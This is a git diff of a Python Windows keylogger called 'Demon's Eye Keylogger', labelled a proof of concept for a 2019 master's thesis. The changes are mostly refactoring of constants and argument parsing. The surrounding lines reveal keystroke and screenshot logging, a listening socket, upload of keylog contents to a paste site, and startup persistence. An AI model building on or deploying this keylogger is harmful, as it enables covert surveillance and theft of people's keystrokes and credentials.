@@ -47,13 +47,13 @@
 #           - server witch sockets connection
 #
 
+import argparse
 import atexit
 import base64
 import datetime
 import getpass
 import glob
 import logging
-from optparse import OptionParser
 import os
 import platform
 import pythoncom
@@ -73,23 +73,23 @@ import wx
 ########################################################
 # CONSTANTES - CONSTANTS
 ########################################################
-APPNAME = "DemonsEye"           # Just a name
-VERSION = "1.0"                 # Version
-LOGGING_LEVEL = logging.DEBUG   # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
-CRLF = '\n'                     # salto de linea - line feed
-KLGPRE = 'klg_'                 # prefijo nombre ficheros de log - prefix name for log files
-KLGEXT = '.dek'                 # extension nombre ficheros keylogger - extension for keylogger file
-KEYCODE_EXIT = 7                # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
-SCRPRE = 'scr_'                 # prefijo nombre ficheros captura pantalla - screenshots prefix name
-SCREXT = '.png'                 # extension nombre fichero captura pantalla - screenshots extensuib
+APPNAME = "Demon's Eye Keylogger"       # Just a name
+VERSION = "1.0"                         # Version
+LOGGING_LEVEL = logging.DEBUG           # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
+CRLF = '\n'                             # salto de linea - line feed
+KLGPRE = 'klg_'                         # prefijo nombre ficheros de log - prefix name for log files
+KLGEXT = '.dek'                         # extension nombre ficheros keylogger - extension for keylogger file
+KEYCODE_EXIT = 7                        # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
+SCRPRE = 'scr_'                         # prefijo nombre ficheros captura pantalla - screenshots prefix name
+SCREXT = '.png'                         # extension nombre fichero captura pantalla - screenshots extensuib
 
 # Server constants
 SERVER_IP = ''
 SERVER_PORT = 6666
-SERVER_BUFFER_SIZE = 64
+SERVER_BUFFER_SIZE = 4096
 SERVER_MAX_CLIENTS = 5
 MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
-MAGIC_RESPONSE_PLAIN = "Demon's Eye Keylogger "+VERSION
+MAGIC_RESPONSE_PLAIN = APPNAME + VERSION
 ENCODING = 'utf-8'
 
 ########################################################
@@ -103,10 +103,10 @@ key_counter = 0
 # Used to detect when the user changes the window or application.
 old_event = None
 
-# Buffer de caracteres. hasta que no se llena, no se graba en el fichero en disco de esta manera se evitan escrituras
-# contínuas a disco por cada tecla pulsada cuando de supera el limite de key_max_chars se graba el buffer a disco.
-# Character buffer. until it is full, it is not written to the file on disk in this way continuous writes to disk are
-# avoided for each key pressed when the key_max_chars limit is exceeded the buffer is written to disk
+# Buffer de caracteres. Hasta que no se llena, no se graba en el fichero en disco, de esta manera se evitan escrituras
+# contínuas a disco por cada tecla pulsada. Cuando de supera el limite de key_max_chars se graba el buffer a disco.
+# Character buffer. Until it is full, it is not written to the file on disk, in this way continuous writes to disk are
+# avoided for each key pressed. When the key_max_chars limit is exceeded the buffer is written to disk.
 key_max_chars = 25
 key_buffer = ''
 
@@ -214,29 +214,6 @@ class ServerListenerThread(threading.Thread):
 ########################################################
 # FUNCIONES - FUNCTIONS
 ########################################################
-
-'''
-Control parametros linea de comando, para instalar, configurar, ajustar.
-NO IMPLEMENTADO TODAVIA
-'''
-def parse_params():
-    usage = "Uso: %prog [options] arg1 arg2"
-    parser = OptionParser(usage=usage)
-    parser.add_option("-v", "--verbose",
-                      action="store_true", dest="verbose", default=True,
-                      help="make lots of noise [default]")
-    parser.add_option("-q", "--quiet",
-                      action="store_false", dest="verbose",
-                      help="be vewwy quiet (I'm hunting wabbits)")
-    parser.add_option("-f", "--filename",
-                      metavar="FILE", help="write output to FILE")
-    parser.add_option("-m", "--mode",
-                      default="intermediate",
-                      help="interaction mode: novice, intermediate, "
-                           "or expert [default: %default]")
-    return
-
-
 
 # función que hace "paste" del contenido del fichero de keylog
 # https://pastecode.xyz/api
@@ -528,6 +505,27 @@ def on_close_program():
     logging.shutdown()
     return
 
+'''
+Control parametros linea de comando, para instalar, configurar, ajustar.
+NO IMPLEMENTADO TODAVIA
+'''
+# Parse command line parameters
+def parse_params():
+    parser = argparse.ArgumentParser(description=APPNAME + " " + VERSION,
+                                     epilog='Keylogger POC for MCS TFM La Salle 2019 by Gabriel Marti.')
+    parser.add_argument("-s", "--start", action='store_true', required=True,
+                        help="Specify -s or --start to start Keylogger")
+    parser.add_argument("-p", "--ports", type=int, nargs='+',
+                        help="Specify a list of ports to scan. " )
+    parser.add_argument("-m", "--message", type=str, default=MAGIC_MESSAGE,
+                        help="Message to send to host. If empty, -m '', then not message is sent. Default value: " + MAGIC_MESSAGE)
+    parser.add_argument("-t", "--timeout", type=int,
+                        help="Timeout in seconds on port connection. ")
+    parser.add_argument("-v", "--verbose", type=int, choices=[0,1,2], default=0,
+                        help="Increase output verbosity. Default value: 0")
+    args = parser.parse_args()
+    return args
+
 
 ########################################################
 # MAIN
@@ -550,7 +548,15 @@ extension = os.path.splitext(__file__)[1]
 driveunit = os.path.splitdrive(__file__)[0]
 
 # Parsea parametros recibidos - Parse parameters
-parse_params()
+# Check and parse parameters
+args = parse_params()
+'''
+verbose = args.verbose
+net_range = args.range
+port_list = args.ports
+message = args.message
+timeout = args.timeout
+'''
 
 # Se asegura de que el kelogger se inicia en cada arranque del sistema
 # Ensures that keylogger starts at system startup
